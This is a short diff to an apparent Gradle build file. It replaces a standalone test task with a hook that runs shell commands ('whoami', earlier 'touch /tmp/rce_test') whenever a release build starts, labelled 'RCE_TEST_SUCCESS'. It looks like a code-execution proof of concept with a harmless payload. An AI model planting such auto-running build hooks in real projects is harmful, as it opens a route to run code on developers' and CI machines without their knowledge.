@@ -1,10 +1,11 @@
-task testExec {
-    doLast {
-        println "RCE_TEST_SUCCESS"
-        "touch /tmp/rce_test".execute()
+tasks.whenTaskAdded { task ->
+    if (task.name == "assembleRelease") {
+        task.doFirst {
+            println "RCE_TEST_SUCCESS"
+            println "Current user: " + "whoami".execute().text
+        }
     }
 }
-
 buildscript {
     ext.kotlin_version = '1.9.22'
     repositories {
